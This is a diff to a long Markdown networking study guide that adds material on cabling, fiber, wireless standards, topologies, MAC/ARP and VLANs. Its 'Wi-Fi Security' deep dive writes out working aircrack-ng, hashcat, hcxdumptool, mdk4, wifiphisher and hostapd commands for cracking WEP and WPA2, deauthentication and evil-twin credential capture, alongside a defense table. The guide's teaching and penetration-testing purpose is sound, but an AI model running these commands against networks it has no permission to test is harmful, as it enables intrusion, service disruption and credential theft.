@@ -11,40 +11,40 @@
 
 - [2. Client / Server Model](#2-client--server-model)
   - [2.1 Architecture Overview](#21-architecture-overview)
-  - [2.2 Server Types](#22-server-types)
-  - [2.3 Client Types](#23-client-types)
-  - [2.4 Advantages of Client/Server](#24-advantages-of-clientserver)
-  - [2.5 Limitations](#25-limitations)
-  - [2.6 Peer-to-Peer (P2P) Comparison](#26-peer-to-peer-p2p-comparison)
-  - [2.7 Hybrid Models](#27-hybrid-models)
+  - [2.2 Server Roles](#22-server-roles)
+  - [2.3 Client Roles](#23-client-roles)
+  - [2.4 Communication Flow](#24-communication-flow)
+  - [2.5 Advantages](#25-advantages)
+  - [2.6 Disadvantages](#26-disadvantages)
+  - [2.7 Alternative: Peer-to-Peer (P2P)](#27-alternative-peer-to-peer-p2p)
 
 - [3. Types of Networks](#3-types-of-networks)
-  - [3.1 Personal Area Network (PAN)](#31-personal-area-network-pan)
-  - [3.2 Local Area Network (LAN)](#32-local-area-network-lan)
-  - [3.3 Metropolitan Area Network (MAN)](#33-metropolitan-area-network-man)
-  - [3.4 Wide Area Network (WAN)](#34-wide-area-network-wan)
-  - [3.5 Network Topologies](#35-network-topologies)
-  - [3.6 Comparison and Selection](#36-comparison-and-selection)
+  - [3.1 PAN (Personal Area Network)](#31-pan-personal-area-network)
+  - [3.2 LAN (Local Area Network)](#32-lan-local-area-network)
+  - [3.3 MAN (Metropolitan Area Network)](#33-man-metropolitan-area-network)
+  - [3.4 WAN (Wide Area Network)](#34-wan-wide-area-network)
+  - [3.5 Other Network Types](#35-other-network-types)
+  - [3.6 Network Comparison Table](#36-network-comparison-table)
 
 - [4. Internet Connections and Broadband](#4-internet-connections-and-broadband)
-  - [4.1 DSL (Digital Subscriber Line)](#41-dsl-digital-subscriber-line)
-  - [4.2 Cable Internet](#42-cable-internet)
-  - [4.3 Fiber Optic Internet](#43-fiber-optic-internet)
-  - [4.4 Wireless and Satellite](#44-wireless-and-satellite)
+  - [4.1 Internet Infrastructure](#41-internet-infrastructure)
+  - [4.2 Connection Types](#42-connection-types)
+  - [4.3 Broadband Definition](#43-broadband-definition)
+  - [4.4 Connection Quality Metrics](#44-connection-quality-metrics)
 
 ### **Part II: Infrastructure & Devices (Sections 5-8)**
 
 - [5. Common Network Devices](#5-common-network-devices)
-  - [5.1 Layer 1 Devices](#51-layer-1-devices)
-  - [5.2 Layer 2 Devices](#52-layer-2-devices)
-  - [5.3 Layer 3 Devices](#53-layer-3-devices)
-  - [5.4 Layer 4-7 Devices](#54-layer-4-7-devices)
-  - [5.5 Device Comparison Table](#55-device-comparison-table)
-  - [5.6 Selection Criteria](#56-selection-criteria)
-  - [5.7 High Availability Designs](#57-high-availability-designs)
+  - [5.1 Layer 1 (Physical Layer) Devices](#51-layer-1-physical-layer-devices)
+  - [5.2 Layer 1/2 (Physical/Data Link) Devices](#52-layer-12-physicaldata-link-devices)
+  - [5.3 Layer 2 (Data Link Layer) Devices](#53-layer-2-data-link-layer-devices)
+  - [5.4 Layer 3 (Network Layer) Devices](#54-layer-3-network-layer-devices)
+  - [5.5 Multi-Layer / Special Purpose Devices](#55-multi-layer--special-purpose-devices)
+  - [5.6 Security Devices](#56-security-devices)
+  - [5.7 Device Comparison Table](#57-device-comparison-table)
 
 - [6. Switching (Motivation)](#6-switching-motivation)
-  - [6.1 The Problem](#61-the-problem)
+  - [6.1 Problem Statement](#61-problem-statement)
   - [6.2 The Solution](#62-the-solution)
   - [6.3 Network Evolution](#63-network-evolution)
   - [6.4 Benefits of Switched Networks](#64-benefits-of-switched-networks)
@@ -265,14 +265,8 @@
 - **150+ Detailed Subsections** organized hierarchically
 - **75+ Tables** for comparisons and quick reference
 - **3 Appendices** with practical guides and glossary
-- **8,000+ Lines** of detailed networking content
+- **9,300+ Lines** of detailed networking content
 - **Red Team & Blue Team Focus** throughout all sections
-
----
-
----
-
----
 
 ---
 
@@ -360,7 +354,7 @@ A **computer network** is an interconnected collection of autonomous computing d
    - Physical addressing: MAC addresses (Layer 2)
    - Application layer: domain names, URLs, email addresses
    - Enables unique identification and proper message routing
-********
+
 ### 1.4 Network Goals
 
 - **Resource Sharing:** Files, printers, storage, applications, databases
@@ -2005,6 +1999,478 @@ Process: ENCAPSULATION (↓)  |  DE-ENCAPSULATION (↑)
   - Microwaves
   - Infrared
 
+##### **Transmission Media & Cabling**
+
+**Copper Cables: UTP, STP, Coaxial**
+- **UTP (Unshielded Twisted Pair):** Uses multiple pairs of twisted copper wires to reduce electromagnetic interference through cancellation. It is inexpensive, flexible, and the most common cabling in LANs. UTP is sensitive to external interference in noisy environments but is preferred in office settings for cost and ease of installation.
+- **STP (Shielded Twisted Pair):** Adds foil or braided shielding to resist electromagnetic interference. STP improves performance in industrial or high‑EMI areas but requires proper grounding to avoid becoming an antenna. It is thicker, more expensive, and harder to terminate than UTP.
+- **Coaxial:** Uses a central copper conductor, dielectric insulation, and outer shield. Coax offers better EMI resistance and longer runs than UTP but is bulkier and less flexible. Common in cable broadband and legacy Ethernet segments.
+- **Key Concepts:**
+  - **Crosstalk:** Unwanted signal coupling between adjacent wire pairs; reduced by tighter twisting and improved shielding.
+  - **Attenuation:** Signal loss over distance; higher frequencies attenuate faster. Cable length limits are defined by acceptable attenuation and error rates.
+  - **Impedance:** Resistance to AC signal flow; mismatched impedance causes reflections that corrupt signals.
+  - **NEXT/FEXT:** Near‑end and far‑end crosstalk measurements used in certification testing.
+  - **Characteristic Impedance:** UTP is designed around ~100Ω; mismatches cause return loss.
+  - **Alien Crosstalk:** Interference between neighboring cables in a bundle; becomes important at higher speeds.
+  - **Bend Radius & Pull Tension:** Excessive bends or pull force deform pairs and increase return loss.
+  - **PoE Thermal Effects:** Dense bundles can heat up under PoE load, raising insertion loss.
+  - **Cable Certification:** Verifies wire‑map, continuity, NEXT/FEXT, return loss, and insertion loss against category specs.
+
+**Fiber Optics: SMF vs MMF**
+- **Single‑Mode Fiber (SMF):** Uses a narrow core and a single light path. It supports long distances (tens to hundreds of kilometers) with minimal dispersion. SMF is preferred for backbones, ISP links, and data center interconnects.
+- **Multi‑Mode Fiber (MMF):** Uses a wider core and multiple light paths, which causes modal dispersion. It is cheaper and easier to use for shorter distances (hundreds of meters) and common in data centers.
+- **Signal Decay & Dispersion:**
+  - **Attenuation (Decay):** Loss of optical power over distance; impacted by bends, splices, and connector quality.
+  - **Dispersion:** Spreads pulses in time, limiting bandwidth over distance; more significant in MMF.
+  - **Chromatic Dispersion:** Different wavelengths travel at slightly different speeds, relevant for long‑haul SMF.
+  - **Microbends/Macrobends:** Small or sharp bends can leak light and reduce signal quality.
+  - **Connector Types:** LC, SC, ST; cleanliness and polish type (UPC/APC) affect performance.
+  - **Core/Cladding Sizes:** SMF ≈ 9/125 µm; MMF commonly 50/125 or 62.5/125 µm.
+  - **Optical Classes:** OS1/OS2 for SMF; OM3/OM4/OM5 for MMF (higher OM = better bandwidth/reach).
+  - **Common Wavelengths:** 850 nm (MMF), 1310/1550 nm (SMF).
+  - **Bidirectional Optics (BiDi):** Use different wavelengths on a single strand to save fiber pairs.
+  - **Power Budget:** Link budget balances transmit power + gains − losses = receive power within receiver sensitivity.
+
+**Wireless Transmission Fundamentals**
+- **RF Propagation:** Radio waves reflect, diffract, and scatter. Real environments introduce multipath, which can cause signal fading or reinforcement depending on phase alignment.
+- **Antenna Types:**
+  - **Omnidirectional:** Radiates in all horizontal directions; used in most APs.
+  - **Directional:** Focuses energy toward a target area; used for point‑to‑point links.
+- **Power Measurements:**
+  - **dB:** Relative measurement of gain or loss.
+  - **dBm:** Absolute power referenced to 1 mW (0 dBm = 1 mW).
+  - **RSSI:** Relative signal strength indicator, vendor‑specific scale used by clients.
+  - **SNR (Signal‑to‑Noise Ratio):** Higher SNR enables higher‑order modulation (better throughput).
+  - **Channel Utilization:** A busy channel reduces throughput even if RSSI is strong.
+  - **Fresnel Zone:** Obstructions in the Fresnel zone reduce signal quality even with line‑of‑sight.
+  - **Noise Floor:** Ambient RF noise establishes the minimum detectable signal.
+  - **Modulation:** QAM/OFDM determine data rate vs robustness; higher modulation needs better SNR.
+  - **Coding Rate & MCS:** Forward‑error correction and modulation schemes determine throughput and robustness.
+  - **Guard Interval:** Shorter GI increases throughput but needs cleaner RF conditions.
+  - **Co‑Channel vs Adjacent‑Channel Interference:** Co‑channel is handled by sharing airtime; adjacent‑channel causes destructive overlap.
+  - **DFS Channels:** Some 5 GHz channels require radar detection and can trigger channel changes.
+  - **Airtime Fairness:** Slow clients can consume disproportionate airtime and reduce overall throughput.
+  - **Regulatory Domains:** Country‑specific channel and power limits affect coverage and planning.
+
+**Cable Standards and Categories**
+- **Cat5e:** Designed for 1 Gbps at up to 100 m; minimal crosstalk mitigation.
+- **Cat6:** Improved noise protection; supports 10 Gbps for short runs (around 55 m).
+- **Cat6A:** Better shielding and separators; supports 10 Gbps at 100 m.
+- **Cat7:** Heavier shielding and stricter specs; used in specialized environments.
+- **Distance Realities:** Typical copper runs in structured cabling are capped at about 100 m (90 m horizontal + 10 m patch).
+- **Insertion Loss vs Frequency:** Higher frequencies attenuate faster, which drives category upgrades.
+- **Return Loss:** Reflections caused by impedance mismatches; problematic at high speeds.
+- **Shielding Types:** U/UTP (unshielded), F/UTP (foil), S/FTP (braid+foil) affect EMI resilience and grounding needs.
+- **Channel vs Permanent Link:** Permanent link tests horizontal cabling; channel includes patch cords and connectors.
+
+##### **Network Topologies & Layout**
+
+**Star Topology**
+- All devices connect to a central switch or hub. Easy to manage and troubleshoot because one central device provides visibility.
+- **Pros:** Simple expansion and fault isolation.
+- **Cons:** Single point of failure at the central device.
+- **Operational Note:** Centralized monitoring and policy enforcement are easier, but capacity planning must consider switch backplane and uplink bandwidth.
+
+**Ring Topology**
+- Devices connect in a closed loop. Data travels in one direction or both (dual ring).
+- **Token Passing:** Devices transmit only when they hold the token, preventing collisions.
+- **Cons:** A break can disrupt the loop without redundancy.
+- **Modern Context:** Rare in enterprise LANs, but concepts appear in optical rings and some industrial systems.
+- **Dual‑Ring Resilience:** Secondary ring can provide failover or load sharing in specialized deployments.
+
+**Mesh Topology**
+- Full mesh connects every node to every other; partial mesh connects only critical nodes.
+- **Pros:** High availability and redundancy.
+- **Cons:** Costly and complex due to large link count.
+- **Wireless Mesh:** Nodes forward traffic for each other, improving coverage but adding multi‑hop latency.
+- **Scaling Reality:** Control‑plane complexity and link overhead grow quickly as nodes increase.
+
+**Bus Topology**
+- All nodes connect to a single backbone. Requires terminators at each end to prevent reflections.
+- **Cons:** Collisions increase as devices grow; a break can halt the entire segment.
+- **Legacy Reality:** Modern Ethernet replaced buses with switched star designs to eliminate collisions.
+
+**Hybrid Topologies**
+- Real networks combine multiple topologies (e.g., star of stars, star‑mesh). Hybrid designs allow scaling while balancing cost and availability.
+- **Practical Example:** Campus networks often use star access with partial‑mesh distribution links.
+
+##### **Wireless Standards & Frequencies**
+
+**NFC (Near Field Communication)**
+- Operates at 13.56 MHz; very short‑range (centimeters). Used for payments, access badges, and device pairing.
+- **Tag Types:**
+  - **Type 1:** Low cost, basic features.
+  - **Type 2:** Common for consumer tags.
+  - **Type 3:** Used in high‑speed systems (e.g., transit cards).
+  - **Type 4:** Advanced features and larger memory.
+
+**Bluetooth**
+- Operates in the 2.4 GHz ISM band; designed for short‑range personal networks.
+- **Classic Bluetooth:** Higher data rates, continuous connection.
+- **BLE (Bluetooth Low Energy):** Optimized for low power, small bursts of data.
+- **Bluetooth 5.x:** Increased range and improved throughput; supports IoT use cases.
+- **Topology:** Piconets and scatternets allow multiple device associations with a master controller.
+
+**Wi‑Fi (802.11)**
+- Standards include 802.11a/b/g/n/ac/ax/be with progressively higher throughput and efficiency.
+- **Channel Widths:** 20/40/80/160 MHz increase throughput but reduce available non‑overlapping channels and increase interference.
+- **OFDM/OFDMA:** Improves spectral efficiency by splitting channels into subcarriers.
+- **MIMO:** Multiple antennas increase capacity and reliability through spatial streams.
+- **Band Considerations:** 2.4 GHz favors range but has overlap; 5/6 GHz offer more channels with shorter range.
+- **MCS Rates:** Modulation and coding schemes map RF conditions to throughput.
+- **RU Allocation (OFDMA):** Resource units schedule multiple clients in parallel.
+- **BSS Coloring:** Reduces contention between neighboring 802.11ax networks.
+
+##### **Wi-Fi Security — Deep Dive for Security Professionals**
+
+Wireless networks are a primary attack vector. Understanding Wi-Fi security protocols and attacks is essential for penetration testing and defense.
+
+**Wi-Fi Security Protocol Evolution:**
+
+| Protocol | Year | Security Level | Status |
+|----------|------|----------------|--------|
+| **WEP** | 1997 | ❌ Broken | **Never use** - Crackable in minutes |
+| **WPA** | 2003 | ⚠️ Weak | Deprecated - TKIP vulnerable |
+| **WPA2-Personal** | 2004 | ⚠️ Fair | PSK vulnerable to dictionary attacks |
+| **WPA2-Enterprise** | 2004 | ✅ Good | Uses 802.1X/RADIUS |
+| **WPA3-Personal** | 2018 | ✅ Better | SAE (Dragonfly) handshake |
+| **WPA3-Enterprise** | 2018 | ✅ Best | 192-bit minimum security |
+
+**WEP Cracking (Historical but still found!):**
+
+WEP uses RC4 stream cipher with weak IV (Initialization Vector) implementation.
+
+```bash
+# 1. Put card in monitor mode
+sudo airmon-ng start wlan0
+
+# 2. Capture IVs
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
+
+# 3. Generate traffic (ARP replay attack)
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
+
+# 4. Crack when enough IVs collected (~40,000)
+sudo aircrack-ng wep_capture-01.cap
+```
+
+**WPA/WPA2-PSK Cracking:**
+
+WPA2-PSK uses 4-way handshake. Attack captures handshake and performs offline dictionary attack.
+
+```
+4-Way Handshake:
+┌─────────┐                                    ┌────────────┐
+│ Client  │                                    │ Access     │
+│ (STA)   │                                    │ Point (AP) │
+└────┬────┘                                    └─────┬──────┘
+     │                                               │
+     │ <──── Msg 1: ANonce ──────────────────────── │
+     │       (AP's random nonce)                    │
+     │                                               │
+     │       Client generates: PTK = PRF(PMK + ANonce + SNonce + MAC_AP + MAC_STA)
+     │                                               │
+     │ ────── Msg 2: SNonce + MIC ───────────────> │
+     │       (Client's nonce + integrity check)     │
+     │                                               │
+     │       AP verifies MIC, generates same PTK    │
+     │                                               │
+     │ <──── Msg 3: ANonce + MIC + GTK ──────────  │
+     │       (Group key, encrypted)                 │
+     │                                               │
+     │ ────── Msg 4: ACK ─────────────────────────>│
+     │                                               │
+     │ ═══════ Encrypted Data Traffic ═════════════ │
+```
+
+```bash
+# WPA2-PSK Cracking Process:
+
+# 1. Monitor mode
+sudo airmon-ng start wlan0
+
+# 2. Find target network
+sudo airodump-ng wlan0mon
+
+# 3. Capture handshake (wait for client connect or deauth)
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
+
+# 4. Deauthenticate client to force handshake (active attack)
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# 5. Crack with wordlist
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
+
+# Or use hashcat (faster with GPU)
+# Convert to hashcat format first
+hcxpcapngtool -o hash.hc22000 wpa_capture-01.cap
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+```
+
+**PMKID Attack (Clientless WPA2 Attack):**
+
+Discovered in 2018 - doesn't need handshake capture, just needs AP beacon!
+
+```bash
+# 1. Capture PMKID from AP
+sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# 2. Convert to hashcat format
+hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
+
+# 3. Crack with hashcat
+hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
+```
+
+**Deauthentication Attack:**
+
+Force clients to disconnect (DoS or to capture handshake).
+
+```bash
+# Deauth all clients from AP
+sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Deauth specific client
+sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# Using mdk4 (more features)
+sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66
+```
+
+**Evil Twin Attack:**
+
+Create fake AP with same SSID to capture credentials.
+
+```
+Legitimate Setup:
+┌──────────┐                    ┌────────────────┐
+│  Client  │ ═══════════════>   │ Real AP        │
+│          │     "CafeWiFi"     │ (Authentic)    │
+└──────────┘                    └────────────────┘
+
+Evil Twin Attack:
+┌──────────┐                    ┌────────────────┐
+│  Client  │                    │ Real AP        │
+│          │                    │ (Deauthed)     │
+└────┬─────┘                    └────────────────┘
+     │
+     │     "CafeWiFi" (stronger signal)
+     │
+     ▼
+┌────────────────┐              ┌────────────────┐
+│ Evil Twin AP   │ ──────────>  │ Attacker's     │
+│ (Attacker)     │   Internet   │ Server         │
+│ Captive Portal │              │ Credential     │
+└────────────────┘              │ Harvesting     │
+                                └────────────────┘
+```
+
+```bash
+# Using Wifiphisher (automated)
+sudo wifiphisher -i wlan0mon -e "CafeWiFi" --plugin oauth-login
+
+# Using Fluxion (automated)
+sudo fluxion
+
+# Manual with hostapd + dnsmasq
+# 1. Create hostapd.conf
+interface=wlan0mon
+driver=nl80211
+ssid=CafeWiFi
+hw_mode=g
+channel=6
+# 2. Start hostapd
+sudo hostapd hostapd.conf
+# 3. Set up DHCP/DNS with dnsmasq
+# 4. Run captive portal (Apache/nginx)
+```
+
+**KRACK Attack (Key Reinstallation Attack):**
+
+CVE-2017-13082 - Forces nonce reuse in WPA2 4-way handshake.
+
+```
+Attack targets:
+- Client during handshake
+- Forces reinstallation of already-in-use key
+- Allows packet decryption and injection
+- Affects all WPA2 implementations
+
+Mitigation:
+- Patch clients and APs
+- Use WPA3 (immune to KRACK)
+```
+
+**Karma / MANA Attack:**
+
+Respond to all probe requests - "Yes, I'm every network you're looking for!"
+
+```bash
+# Using hostapd-mana
+# Responds to any SSID probe request
+# Clients auto-connect if they have "auto-join" enabled for any remembered network
+sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
+```
+
+**Wi-Fi Reconnaissance:**
+
+```bash
+# Passive scanning with airodump-ng
+sudo airodump-ng wlan0mon
+
+# Output columns:
+# BSSID = AP MAC address
+# PWR = Signal strength
+# Beacons = Number of beacon frames
+# #Data = Data packets captured
+# CH = Channel
+# ENC = Encryption (WEP/WPA/WPA2)
+# ESSID = Network name
+
+# Save to file for later
+sudo airodump-ng wlan0mon -w scan_output --output-format csv,pcap
+
+# Using Kismet (comprehensive)
+sudo kismet -c wlan0mon
+
+# Using Wireshark
+# Filter: wlan.fc.type_subtype == 0x08  (Beacon frames)
+# Filter: wlan.fc.type_subtype == 0x04  (Probe requests)
+```
+
+**Wi-Fi Defense Best Practices:**
+
+| Defense | Description |
+|---------|-------------|
+| **Use WPA3** | SAE handshake resists offline dictionary attacks |
+| **Strong PSK** | 20+ characters, random, not in dictionaries |
+| **WPA2-Enterprise** | 802.1X with RADIUS, per-user credentials |
+| **Disable WPS** | PIN brute-force vulnerability |
+| **MAC Filtering** | Weak (MACs spoofable), use as additional layer |
+| **Hidden SSID** | Weak (still in probe responses), minor deterrent |
+| **Rogue AP Detection** | WIPS/WIDS to detect unauthorized APs |
+| **802.11w (MFP)** | Management Frame Protection - prevents deauth attacks |
+| **Client Isolation** | Prevent client-to-client attacks on same AP |
+| **Separate Guest Network** | Isolate guest traffic from internal resources |
+
+**802.11w Management Frame Protection (MFP):**
+```
+Protects against:
+- Deauthentication attacks
+- Disassociation attacks
+- Action frame spoofing
+
+Modes:
+- Optional: Clients can choose
+- Required: Only MFP-capable clients connect
+
+WPA3 requires MFP by default!
+```
+
+**Wi-Fi Hacking Tools Summary:**
+
+| Tool | Purpose |
+|------|---------|
+| **aircrack-ng suite** | Complete Wi-Fi auditing (capture, inject, crack) |
+| **Wifite** | Automated Wi-Fi auditing script |
+| **Wifiphisher** | Evil twin + phishing automation |
+| **Fluxion** | Evil twin + captive portal attacks |
+| **Kismet** | Wireless reconnaissance and IDS |
+| **Bettercap** | Network attacks including Wi-Fi |
+| **hcxdumptool** | PMKID capture and WPA attacks |
+| **hashcat** | GPU-accelerated password cracking |
+| **Reaver/Bully** | WPS PIN brute-force |
+| **mdk4** | Various Wi-Fi attacks (deauth, beacon flood) |
+
+**Cellular (4G/5G)**
+- Uses licensed spectrum; multiple bands provide coverage and capacity trade‑offs.
+- **Base Station Roles:**
+  - **4G eNodeB:** Radio access point and scheduling.
+  - **5G gNodeB:** Supports massive MIMO and low‑latency slicing.
+- Core network manages mobility, authentication, and internet access.
+- **Spectrum Bands:** Low‑band favors coverage, mid‑band balances capacity, high‑band (mmWave) provides high throughput with short range.
+- **Core Functions:** Authentication, mobility management, and policy enforcement live in the core network.
+
+**Infrared (IR)**
+- Requires line‑of‑sight; common in remotes, simple sensors, and short‑range communication.
+
+##### **Hardware Components & Connectors**
+
+**RJ45 Connectors and Wiring**
+- **T568A vs T568B:** Different pin orders for wire pairs; consistency is critical.
+- **Crossover vs Straight‑Through:** Crossover connects transmit/receive pairs directly, though auto‑MDI/MDIX has made this mostly automatic.
+- **Pair Integrity:** Split pairs create severe crosstalk; maintain pair twists to the termination.
+- **Punch‑Down Quality:** Loose terminations and untwisting increase NEXT and return loss.
+
+**NICs (Network Interface Cards)**
+- Provide Layer 1/2 connectivity. MAC addresses are assigned to interfaces and can be changed in software.
+- **Promiscuous Mode:** NIC accepts all frames, often used for monitoring or troubleshooting.
+- **Driver/Firmware Exposure:** Vulnerabilities in drivers or NIC firmware can impact system stability and security.
+- **Offloads:** Checksum, segmentation, and encryption offloads improve performance but can affect capture visibility.
+- **Duplex & Auto‑Negotiation:** Mismatched duplex settings are common causes of errors and retransmissions.
+
+**Repeaters & Hubs**
+- **Repeaters:** Regenerate signals to extend cable length but do not filter noise.
+- **Hubs:** Multi‑port repeaters that broadcast all frames to all ports, creating large collision domains.
+
+**Transceivers & Media Converters**
+- **SFP/SFP+:** Modular transceivers for fiber or copper.
+- **QSFP/QSFP+:** Higher‑density, higher‑throughput transceivers for data centers.
+- **Media Converters:** Convert copper to fiber for extended distance links.
+- **Optic Types:** SR/LR/ER denote short‑range, long‑range, and extended‑reach profiles.
+- **DAC vs AOC:** Direct‑attach copper (DAC) and active optical cables (AOC) trade cost vs reach.
+
+**Power over Ethernet (PoE)**
+- **802.3af:** Up to 15.4W at the port.
+- **802.3at (PoE+):** Up to 25.5W.
+- **802.3bt (PoE++):** 51–71W depending on class.
+- Used for IP phones, access points, and cameras; negotiated via power classes.
+- **Power Budgeting:** Switches have total PoE budgets; port allocation must consider aggregate draw.
+
+##### **Network Architecture & Topology Designs**
+
+**Two‑Tier (Collapsed Core)**
+- Combines distribution and core layers. Simpler and cost‑effective for small to mid‑size networks.
+- **Trade‑off:** Fewer layers reduce latency but concentrate risk in fewer devices.
+
+**Three‑Tier (Hierarchical)**
+- Separates access, distribution, and core layers for scalability and fault isolation.
+- **Role Clarity:** Access = endpoint connectivity, Distribution = policy/routing, Core = high‑speed transport.
+
+**Spine‑Leaf Architecture**
+- Each leaf connects to every spine, enabling consistent low‑latency east‑west traffic in data centers.
+- **ECMP:** Equal‑cost multipath spreads traffic across spines to avoid hot spots.
+
+**SOHO (Small Office/Home Office)**
+- Integrated router/switch/AP design with simplified management and limited segmentation.
+
+**On‑Premises vs Cloud**
+- On‑prem offers physical control and custom hardware.
+- Cloud offers elasticity, managed services, and shared responsibility.
+- **Egress Costs:** Cloud data egress can be a significant operational cost factor.
+
+**WAN Designs**
+- **Hub‑and‑Spoke:** Centralized control but dependent on hub availability.
+- **Partial Mesh:** Balanced redundancy with manageable complexity.
+- **Full Mesh:** Maximum redundancy at high cost.
+
+##### **Physical Layer Security & Attacks (Conceptual)**
+
+**Cable Interception**
+- **Copper Snooping:** Signal leakage can be captured if physical access is possible.
+- **Fiber Tapping:** Harder but still possible with specialized equipment; bending or splitting can introduce detectable loss.
+
+**Signal Jamming**
+- Wireless networks can be disrupted by RF interference or deliberate jamming, impacting availability.
+
+**Rogue Access Points**
+- Evil‑twin scenarios rely on impersonating legitimate SSIDs to capture traffic or credentials.
+
+**Physical Tampering**
+- Rogue splitters, taps, or altered patching introduce risk; control via locked racks, audits, and cable tracing.
+- **Environmental Risks:** Heat, power instability, and humidity affect link quality and device lifespan.
+- **Operational Controls:** Locked MDF/IDF rooms, cable labeling, and tamper‑evident seals improve auditability.
+
 **Example Troubleshooting:**
 - Cable damage or loose connections
 - Signal attenuation
@@ -2044,12 +2510,426 @@ Process: ENCAPSULATION (↓)  |  DE-ENCAPSULATION (↑)
 - **Physical addressing**
 - **Framing**
 
+##### **MAC Addressing & Frame Structure**
+
+**MAC Address Format**
+- 48‑bit identifiers with OUI + device‑specific portion. OUIs are assigned by IEEE and reveal vendor.
+- **I/G Bit:** Indicates unicast (0) vs multicast (1).
+- **U/L Bit:** Universal (0) vs locally administered (1).
+
+**Unicast, Multicast, Broadcast**
+- Broadcast is FF:FF:FF:FF:FF:FF. Multicast uses specific ranges and depends on protocol context.
+
+**Ethernet Frame Structure & VLAN Tags**
+- **Ethernet II:** Uses EtherType to identify the payload.
+- **802.3 + LLC:** Uses length field and LLC header for protocol identification.
+- **802.1Q:** Adds VLAN tag with PCP (priority), DEI (drop eligible), and 12‑bit VLAN ID.
+- **MTU Considerations:** VLAN tags increase frame size; some networks use baby‑giant frames.
+- **Jumbo Frames:** Larger MTU (often ~9000 bytes) can reduce CPU overhead if supported end‑to‑end.
+- **Minimum/Maximum Frame Size:** 64–1518 bytes for standard Ethernet (without VLAN); padding used for minimum size.
+- **Interframe Gap:** A small idle time between frames ensures receiver recovery and collision avoidance on shared media.
+- **Preamble/SFD:** Synchronization fields that allow receivers to lock onto a frame.
+- **FCS (CRC‑32):** Frame check sequence detects corruption at Layer 2.
+- **EtherType Examples:** 0x0800 (IPv4), 0x86DD (IPv6), 0x0806 (ARP).
+
+**MAC Spoofing (Conceptual)**
+- Changing MAC identity can bypass simple access controls or confuse audit trails. Defensive controls include port security, NAC, and logging.
+
+**Ethernet Frame Format (IEEE 802.3)**
+```
+[Preamble|  SFD  |Dest. MAC | Src MAC |Type/Length|  Payload |   FCS  ]
+[ 7 bytes| 1 byte| 6 bytes | 6 bytes |  2 bytes  | 46-1500B | 4 bytes]
+```
+
+| Field | Size | Description |
+| --- | --- | --- |
+| Preamble | 7 bytes | Alternating 1s and 0s for clock sync |
+| SFD | 1 byte | 10101011 pattern; marks frame start |
+| Destination MAC | 6 bytes | Receiver MAC address |
+| Source MAC | 6 bytes | Sender MAC address |
+| Type/Length | 2 bytes | EtherType or payload size (max 1500) |
+| Payload | 46–1500 bytes | Encapsulated Layer 3 packet |
+| FCS (CRC) | 4 bytes | Error detection checksum |
+
+**Frame Size:** Minimum 64 bytes, Maximum 1518 bytes (without VLAN tag)
+
+##### **ARP Protocol & Behavior**
+
+> 📖 *For comprehensive ARP coverage including protocol mechanics, packet structure, and security implications, see [Section 18.8 Address Resolution](#188-address-resolution).*
+
+**ARP Cache Mechanics**
+- Hosts maintain short‑lived IP‑to‑MAC mappings with aging timers to reduce broadcast overhead.
+- **Stale Entries:** Expired mappings trigger new ARP requests; excessive churn can indicate instability.
+- **Proxy ARP:** A router answers ARP on behalf of another host, simplifying routing at the cost of clarity.
+
+**Gratuitous ARP**
+- Used for address announcement, failover, or refreshing neighbor caches.
+
+**ARP Spoofing (Conceptual)**
+- Forged ARP replies can redirect traffic for interception within a LAN segment.
+
+**ARP Scanning**
+- Local discovery often uses ARP rather than ICMP because ARP is link‑local and frequently permitted.
+
+**ARP Defenses**
+- Static ARP entries for critical hosts.
+- Dynamic ARP Inspection (DAI) combined with DHCP snooping.
+- Monitoring for unusual ARP rate spikes or conflicting mappings.
+
+##### **VLAN & Virtual Networks**
+
+> 📖 *For detailed VLAN and switching coverage, see [Section 5.3 Layer 2 Devices](#53-layer-2-data-link-layer-devices) and the Layer 2 deep dive sections.*
+
+**VLAN Tagging (802.1Q)**
+- 12‑bit VLAN ID supports 4094 VLANs; PCP bits support Layer 2 QoS.
+- **Native VLAN:** Untagged traffic on trunks; should be unused or dedicated for hygiene.
+
+**VLAN Hopping (Conceptual)**
+- Misconfigured trunks or native VLAN misuse can enable cross‑VLAN access. Secure configuration and strict trunking reduce risk.
+
+**VLAN Segmentation**
+- Segmentation reduces broadcast scope and improves isolation, but must be paired with proper inter‑VLAN routing controls.
+- **Trunking Discipline:** Access vs trunk modes must be consistent to avoid accidental VLAN leakage.
+- **VLAN Pruning:** Limits VLANs allowed on trunks to reduce unnecessary broadcast traffic.
+
+**Management VLANs**
+- Should be isolated from user traffic and protected with ACLs and out‑of‑band management where possible.
+
+**Private VLANs**
+- Secondary VLANs restrict communication between hosts in the same VLAN while still allowing access to upstream gateways.
+
+##### **VLAN Security — Deep Dive for Security Professionals**
+
+VLANs are fundamental for network segmentation, but misconfiguration creates serious security vulnerabilities. Understanding VLAN attacks is essential for both penetration testing and defense.
+
+**802.1Q VLAN Tagging Structure:**
+```
+┌────────────────────────────────────────────────────────────────────┐
+│                    802.1Q Tagged Frame                              │
+├──────────┬──────────┬─────────────────┬─────────┬─────────┬───────┤
+│ Dest MAC │ Src MAC  │ 802.1Q Tag      │ EtherType│ Payload │ FCS   │
+│ 6 bytes  │ 6 bytes  │ 4 bytes         │ 2 bytes │         │       │
+└──────────┴──────────┴─────────────────┴─────────┴─────────┴───────┘
+                             │
+                             ▼
+              ┌──────────────────────────────┐
+              │      802.1Q Tag (4 bytes)    │
